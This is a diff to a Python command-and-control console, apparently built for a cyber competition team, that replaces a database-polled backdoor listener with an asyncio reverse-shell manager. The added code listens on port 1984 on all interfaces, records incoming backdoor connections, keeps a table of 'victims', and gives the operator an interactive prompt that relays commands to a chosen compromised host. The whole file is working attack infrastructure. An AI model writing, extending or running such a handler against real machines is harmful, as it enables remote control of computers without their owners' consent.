@@ -7,9 +7,13 @@ import daemon.pidfile
 import daemon
 import time
 import os
-import exploit
-import backdoor
+import aiochannel
+import aioconsole
+from typing import Optional
 
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 1984
+BUFFER_SIZE = 16384
 
 
 
@@ -17,32 +21,44 @@ engine = None
 metadata = None
 conn = None
 
-def listener():
-    running_backdoors = {}
-    while True:
-        print("Checking for new backdoors...")
-        #sleep for 1 second
-        time.sleep(1)
-        #get the active backdoors from the database
-        active_backdoors_query = db.select(active_backdoors)
-        #execute the query
-        active_backdoors_result = conn.execute(active_backdoors_query)
-        #loop through the results
-        for backdoor in active_backdoors_result:
-            if backdoor[0] not in running_backdoors:
-                #create a new backdoor
-                print(f"Creating new backdoor for {backdoor[2]}:{backdoor[3]}")
-                running_backdoors[backdoor[0]] = ReverseShell(backdoor[2], backdoor[3], backdoor[2], backdoor[3])        
+class ReverseShellManager:
+    def __init__(self):
+        self.backdoors = {}
+    def list_backdoors(self):
+        return list(self.backdoors.keys())
+    async def read(self, backdoor)-> Optional[bytes]:
+        if backdoor not in self.backdoors:
+            return None
+        #check if the backdoor is still connected
+        if self.backdoors[backdoor][0].at_eof():
+            #prune the backdoor
+            del self.backdoors[backdoor]
+            return None
+        #read the data
+        return await self.backdoors[backdoor][0].read(BUFFER_SIZE)
+    async def write(self, backdoor, data) -> bool:
+        if backdoor not in self.backdoors:
+            return False
+        #check if the backdoor is still connected
+        if self.backdoors[backdoor][1].is_closing():
+            #prune the backdoor
+            del self.backdoors[backdoor]
+            return False
+        #write the data
+        self.backdoors[backdoor][1].write(data)
+        await self.backdoors[backdoor][1].drain()
+        return True
+    async def __handle_backdoor__(self, reader, writer):
+        print(colored(f"New backdoor connection from {writer.get_extra_info('peername')[0]}:{writer.get_extra_info('peername')[1]}", 'green'))
+        remote = writer.get_extra_info('peername')[0] + ":" + str(writer.get_extra_info('peername')[1])
+        self.backdoors[remote] = (reader, writer)
+        #await it closing
+        await self.backdoors[remote][1].wait_closed()
 
 def signal_handler(sig, frame):
-    print('\nControl-C detected, exiting...')
-    # Close the database connection
-    conn.commit()
-    conn.close()
-    # Exit the program
     exit(0)
     
-def list_victims():
+def list_victims(conn, victims):
     # Get the victims
     victims_query = db.select(victims)
     # Execute the query
@@ -58,8 +74,24 @@ def list_victims():
         print(colored(f"{victim[1]}", 'blue'), end='\t')
         print(colored(f"{victim[2]}", 'yellow'))
     print("--------------------------------------------------")
+def list_backdoors(rsm):
+    # Get the victims
+    backdoors = rsm.list_backdoors()
+    # Print the results
+    print("Backdoors:")
+    print("\tOrigin:\t\t\t")
+    print("--------------------------------------------------")
+    for backdoor in backdoors:
+        #print bullet point
+        print(colored("*", 'red'), end='\t')
+        print(colored(f"{backdoor}", 'green'))
+    if len(backdoors) == 0:
+        print(colored("*", 'red'), end='\t')
+        print(colored("No backdoors connected", 'yellow'))
+    print("--------------------------------------------------")
 
-if __name__ == '__main__':
+async def main():
+    io_lock = asyncio.Lock()
     parser = argparse.ArgumentParser()
     parser.add_argument('--db', type=str, default='./bermuda_state.db')
     parser.add_argument('--listener', type=bool, default=False)
@@ -75,17 +107,6 @@ if __name__ == '__main__':
         metadata,
         db.Column("id", db.Integer, primary_key=True),
         db.Column("ip", db.String),
-        db.Column("comment", db.String, default="")
-    )
-    active_backdoors = db.Table(
-        "ActiveBackdoor",
-        metadata,
-        db.Column("id", db.Integer, primary_key=True),
-        db.Column("victim_id", db.Integer, db.ForeignKey("Victim.id")),
-        db.Column("ip", db.String),
-        db.Column("port", db.Integer),
-        db.Column("type", db.String),
-        db.Column('last_alive', db.DateTime, default=db.func.current_timestamp()),
         db.Column("comment", db.String, default="")
     )
     
@@ -107,27 +128,20 @@ Go C3T, Beat Airforce
         print(colored(c, colors[index % len(colors)]), end='')
         
     
-    if args.listener:
-        listener()
-        exit(0)
-    # check if the daemon is running
-    if os.path.exists('/tmp/bemuda.pid'):
-        print("Daemon already running...connecting")
-    else:
-        print("Daemon not running, launching...")
-        pid = os.fork()
-        if pid == 0:
-            with daemon.DaemonContext(pidfile=daemon.pidfile.PIDLockFile('/tmp/bemuda.pid')):
-                listener()
-        
-    
     # Create the tables
     metadata.create_all(engine)
     
     print(f"Connected to database located at {args.db}")
+    
+    rsm = ReverseShellManager()
+    # Create the server
+    server = await asyncio.start_server(rsm.__handle_backdoor__, SERVER_HOST, SERVER_PORT)
+    await server.start_serving()
     while True:
         # Get the command
-        command = input(">>> ")
+        command = ""
+        async with io_lock:
+            command = await aioconsole.ainput("> ")
         # split the command
         command = command.split()
         if len(command) == 0:
@@ -137,7 +151,7 @@ Go C3T, Beat Airforce
         elif command[0] == "exit":
             break
         elif command[0] == "list" or command[0] == "ls" or command[0] == "show":
-            list_victims()
+            list_victims(conn, victims)
         elif command[0] == "new" or command[0] == "add" or command[0] == "create":
             if len(command) < 2:
                 print("Usage: new victim_ip_or_hostname [comment]")
@@ -147,15 +161,60 @@ Go C3T, Beat Airforce
             if len(command) > 2:
                 comment = " ".join(command[2:])
             conn.execute(victims.insert().values(ip=command[1], comment=comment))
-            list_victims()
+            list_victims(conn, victims)
         elif command[0] == "delete" or command[0] == "del" or command[0] == "rm":
             if len(command) < 2:
                 print("Usage: delete victim_id")
                 continue
             conn.execute(victims.delete().where(victims.c.id == command[1]))
-            list_victims()
+            list_victims(conn, victims)
+        elif command[0] == "shells" or command[0] == "backdoors":
+            list_backdoors(rsm)
+        elif command[0] == "interact" or command[0] == "attach" or command[0] == "connect":
+            if len(command) < 2:
+                print("Usage: interact (shell_ip:shell_port)") 
+                continue
+            if len(rsm.backdoors) == 0:
+                print("No reverse shells connected")
+                continue
+            if command[1] not in rsm.list_backdoors():
+                print("Invalid selection, pick one of the following:")
+                list_backdoors(rsm)
+                continue
+            selection = command[1]
+            async def read():
+                while True:
+                    read_bytes = await rsm.read(selection)
+                    if read_bytes is None:
+                        break
+                    print("read_bytes")
+                    print(read_bytes.decode(), end="")
+            async def write():
+                while True:
+                    input_bytes = ""
+                    async with io_lock:
+                        input_bytes = await aioconsole.ainput(f"{selection}> ")
+                    #add newline
+                    input_bytes += "\n"
+                    if input_bytes == "":
+                        continue
+                    elif input_bytes.lower().strip() == "exit":
+                        print("Exiting reverse shell")
+                        break
+                    else:
+                        await rsm.write(selection, input_bytes.encode())
+            tasks = [asyncio.create_task(read()), asyncio.create_task(write())]
+            #wait for first task to finis
+            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+            #cancel the other task
+            for task in pending:
+                task.cancel()
+
         else:
             print(f"Unknown command {command[0]}")
         #commit changes
         conn.commit()
     conn.close()
+    
+if __name__ == "__main__":
+    asyncio.run(main())
